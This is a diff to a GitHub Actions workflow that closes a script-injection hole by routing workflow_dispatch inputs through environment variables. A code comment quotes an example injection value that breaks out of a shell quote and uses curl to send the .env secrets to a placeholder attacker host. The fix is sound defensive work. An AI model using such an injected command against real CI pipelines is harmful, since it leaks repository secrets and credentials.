@@ -130,15 +130,25 @@ jobs:
           echo "[OK] Wrote .gcp-saved-tokens.json"
 
       - name: Run recovery
+        # Route inputs through env vars so the shell sees `$VAR` rather than
+        # having the templating engine splice attacker-controlled text
+        # directly into the script body. Without this indirection a
+        # workflow_dispatch caller can break out of the quoted context with
+        # e.g. `foo"; curl https://attacker/$(cat .env) #` and exfiltrate
+        # the secrets written by the previous step. Mirrors the safe pattern
+        # used in cleanup-phantom-recovery-slugs.yml.
+        env:
+          APPLY: ${{ inputs.apply }}
+          SITE: ${{ inputs.site }}
         run: |
           ARGS=()
-          if [ "${{ inputs.apply }}" = "true" ]; then
+          if [ "${APPLY}" = "true" ]; then
             ARGS+=(--apply)
           else
             ARGS+=(--dry-run)
           fi
-          if [ -n "${{ inputs.site }}" ]; then
-            ARGS+=(--site "${{ inputs.site }}")
+          if [ -n "${SITE}" ]; then
+            ARGS+=(--site "${SITE}")
           fi
           uv run python scripts/recover_migration_wiped_sites.py "${ARGS[@]}"
 
